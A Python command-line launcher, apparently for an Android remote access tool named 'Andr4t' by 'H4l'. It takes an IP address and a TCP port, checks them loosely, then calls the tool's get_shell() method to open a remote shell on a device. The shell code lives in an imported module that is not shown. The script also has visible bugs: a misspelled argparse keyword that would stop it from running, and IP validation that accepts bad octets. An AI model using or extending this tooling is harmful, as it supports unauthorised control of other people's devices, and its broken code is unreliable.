import sys
import argparse
from pathlib import Path

parent_dir = str(Path(__file__).parent.parent)
sys.path.append(parent_dir + r'\andr4t')
from andr4t import Andr4t

#  _   _ _  _   _              _              _      _  _   _
# | | | | || | | |            / \   _ __   __| |_ __| || | | |_
# | |_| | || |_| |  _____    / _ \ | '_ \ / _` | '__| || |_| __|
# |  _  |__   _| | |_____|  / ___ \| | | | (_| | |  |__   _| |_
# |_| |_|  |_| |_|         /_/   \_\_| |_|\__,_|_|     |_|  \__|
#                                                   coded by H4l


def main() -> None:
    """
    メイン処理
    """
    #args = sys.argv   #sysによる引数の取得。argsにリストで格納
    # TODO args parserを用いて、socket通信用のip, portを指定する。
    parser = argparse.ArgumentParser(descriotion="コマンドラインの引数を取得")   #パーサー作成
    parser.add_argument("arg1",help="-a",type=str)   #引数設定
    parser.add_argument("arg2",help="IPアドレス",type=str)
    parser.add_argument("arg3",help="-p",type=str)
    parser.add_argument("arg4",help="TCP port番号",type=str)
    args = parser.parse_args( )   #引数解析

    ip=""
    port=0
    if(args.arg1=="-a"):   #-aと記述されているか？
        iplist=args.arg2.split('.')   #ipアドレスを.で区切りそれぞれiplistに格納
        if(len(iplist)==4):   #iplistの要素数が4つであるか
            for i in range(4):   #4つの値を検査
                if(0<=int(iplist[i]) and int(iplist[i])<=255):   #ipが0～255であるか
                    pass
                else:
                    print("IPアドレスの記述にミスがあります")
                    break
            ip=args.arg2
        else:
            print("IPアドレスの記述にミスがあります")
    else:
        print("IPアドレスは-aから記述してください")
    
    if(ip==args.arg2):   #IPアドレスの記述が正常であった場合
        if(args.arg3=="-p"):   #-pと記述されているか？
            try:
                port=int(args.arg4)   #int型変換
            except:
                print("ポート番号は数値のみ記述してください")   #数値以外の記載があった場合
        else:
            print("ポート番号は-pから記述してください")   #ポート番号記述前に-pを記述していない場合

    print(ip,port)  

    android = Andr4t(ip, port) #androidはAndr4tのインスタンス
    android.get_shell()


if (__name__ == "__main__"):
    main()
